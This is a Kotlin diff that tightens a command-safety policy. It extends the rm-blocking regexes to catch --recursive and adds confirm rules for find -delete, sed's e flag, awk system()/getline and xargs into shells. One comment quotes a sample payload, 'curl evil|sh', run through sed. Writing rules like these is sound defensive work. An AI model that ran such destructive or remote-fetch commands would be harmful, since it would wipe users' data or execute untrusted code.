@@ -55,22 +55,24 @@ object CommandPolicy {
 
     private val blockedPatterns: List<Triple<Regex, String, String>> = listOf(
         Triple(
-            Regex("""\brm\s+(-[a-zA-Z]*[rR][a-zA-Z]*\s+)+.*"""),
+            // 修复 issue #14：兼容长选项 --recursive（旧正则只匹配短选项，
+            // `rm --recursive /` 会从 BLOCKED 降级为 CONFIRM）
+            Regex("""\brm\s+((?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\s+)+.*"""),
             "递归删除",
             "递归删除会连同子目录一起抹掉，通常无法恢复",
         ),
         Triple(
-            Regex("""\brm\s+(-[a-zA-Z]*[rR][a-zA-Z]*\s+)*/(\s|$)"""),
+            Regex("""\brm\s+((?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\s+)*/(\s|$)"""),
             "删除根目录",
             "删除根目录会破坏整个文件系统",
         ),
         Triple(
-            Regex("""\brm\s+(-[a-zA-Z]*[rR][a-zA-Z]*\s+)*~(\s|/|$)"""),
+            Regex("""\brm\s+((?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\s+)*~(\s|/|$)"""),
             "删除家目录",
             "删除家目录会丢失全部个人文件",
         ),
         Triple(
-            Regex("""\brm\s+(-[a-zA-Z]*[rR][a-zA-Z]*\s+)*\*(\s|$)"""),
+            Regex("""\brm\s+((?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\s+)*\*(\s|$)"""),
             "通配符递归删除",
             "对所有文件执行递归删除，风险不可控",
         ),
@@ -136,6 +138,16 @@ object CommandPolicy {
         Regex("""\b(reboot|shutdown)\b""") to "设备电源操作",
         Regex(""">\s*[^|&\s]""") to "重定向写入文件",
         Regex("""\bgit\s+(push|reset|clean|checkout\s+--)\b""") to "可能丢失改动的 git 操作",
+        // ── 修复 issue #14：二阶执行向量收紧 ──
+        // find -delete：白名单只读命令里的批量删除开关，必须确认
+        Regex("""\bfind\b[^|;&\n]*\s-delete(\b|=)""") to "批量删除（find -delete）",
+        // GNU sed 的 e 标志 / e 命令：把模式空间当命令执行（如 sed 's/.*/curl evil|sh/e'）
+        Regex("""\bsed\b[^|;&\n]*\be(['"\s/]|$)""") to "sed 含命令执行语义（e 标志）",
+        // awk 的 system() / | getline：二阶执行任意命令
+        Regex("""\bawk\b[^|;&\n]*\bsystem\s*\(""") to "awk 含命令执行（system()）",
+        Regex("""\bawk\b[^|;&\n]*\|\s*getline""") to "awk 含命令执行（| getline）",
+        // xargs 把管道输入交给 shell 命令执行
+        Regex("""\bxargs\b[^|;&\n]*\b(sh|bash|zsh|rm|dd|mkfs)\b""") to "xargs 转发危险命令",
     )
 
     /** 按连接符切段。 */
